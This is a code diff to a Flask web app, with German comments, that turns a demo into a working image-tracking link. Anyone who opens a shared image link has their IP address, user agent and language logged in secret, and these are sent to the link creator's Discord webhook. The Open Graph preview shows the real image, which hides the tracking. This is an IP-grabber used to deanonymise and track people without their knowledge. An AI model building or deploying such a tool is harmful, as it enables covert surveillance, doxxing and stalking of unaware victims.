@@ -39,12 +39,10 @@ def upload_image():
             'visits': []
         }
         
-        # Speichere als JSON-String (keine Datei schreiben für Vercel)
-        # In Vercel müssen wir temporäre Speicherung verwenden
-        import tempfile
-        with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
-            json.dump(tracking_data, f, indent=2, ensure_ascii=False)
-            temp_file = f.name
+        # Speichere Tracking-Daten in einer globalen Variable (für Vercel)
+        if not hasattr(app, 'tracking_data'):
+            app.tracking_data = {}
+        app.tracking_data[tracking_id] = tracking_data
         
         # Generiere Tracking-URL
         protocol = 'https://'
@@ -68,8 +66,13 @@ def track_image():
         return "Tracking-Parameter fehlt", 400
     
     try:
-        # Für Vercel: Wir simulieren Tracking-Daten
-        # In einer echten App würdest du hier die Daten laden
+        # Lade Tracking-Daten aus globaler Variable
+        if not hasattr(app, 'tracking_data') or tracking_id not in app.tracking_data:
+            return "Tracking-Link nicht gefunden", 404
+            
+        tracking_data = app.tracking_data[tracking_id]
+        
+        # Sammle Besucher-Informationen
         visitor_info = {
             'ip': request.remote_addr or 'Unbekannt',
             'user_agent': request.headers.get('User-Agent', 'Unbekannt'),
@@ -78,16 +81,18 @@ def track_image():
             'language': request.headers.get('Accept-Language', 'Unbekannt')
         }
         
-        # Sende Discord-Benachrichtigung
+        # Füge Besuch hinzu
+        tracking_data['visits'].append(visitor_info)
+        
+        # Sende Discord-Benachrichtigung mit echtem Webhook
         try:
-            webhook_url = "https://discord.com/api/webhooks/dein-webhook"  # Platzhalter
+            webhook_url = tracking_data['webhook_url']
             send_discord_notification(webhook_url, visitor_info, tracking_id)
         except:
             pass  # Discord-Benachrichtigung ist optional
         
-        # Zeige Tracking-Seite mit Open Graph Meta-Tags
-        # Für Demo-Zwecke zeigen wir ein Platzhalter-Bild
-        image_url = "https://picsum.photos/800/600"
+        # Zeige Tracking-Seite mit echtem Bild
+        image_url = tracking_data['image_url']
         
         return f"""
 <!DOCTYPE html>
